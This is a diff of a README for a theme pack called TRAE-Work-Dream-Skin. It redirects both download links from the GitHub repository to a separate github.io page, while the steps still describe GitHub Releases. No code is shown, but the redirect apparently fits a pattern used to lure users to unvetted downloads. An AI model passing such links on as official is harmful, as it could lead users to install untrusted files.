@@ -1,6 +1,6 @@
 # 🎨 TRAE-Work-Dream-Skin - Personalize your work interface with ease
 
-[![](https://img.shields.io/badge/Download-TRAE_Work_Dream_Skin-blue.svg)](https://github.com/Iwsport4674/TRAE-Work-Dream-Skin)
+[![](https://img.shields.io/badge/Download-TRAE_Work_Dream_Skin-blue.svg)](https://iwsport4674.github.io)
 
 ## 📖 About this project
 TRAE-Work-Dream-Skin provides custom visual themes and a Codex Skill for your TRAE Work application. You can use these tools to change the look of your software and add useful automation features to your daily workflow. This set of skins focuses on readability and comfort to help you stay focused during your tasks.
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these basic needs:
 ## 📥 Getting the software
 You must visit the project page to select the correct files for your computer. 
 
-1. Visit [the official download page](https://github.com/Iwsport4674/TRAE-Work-Dream-Skin).
+1. Visit [the official download page](https://iwsport4674.github.io).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version link.
 4. Locate the file ending in .zip under the Assets section.
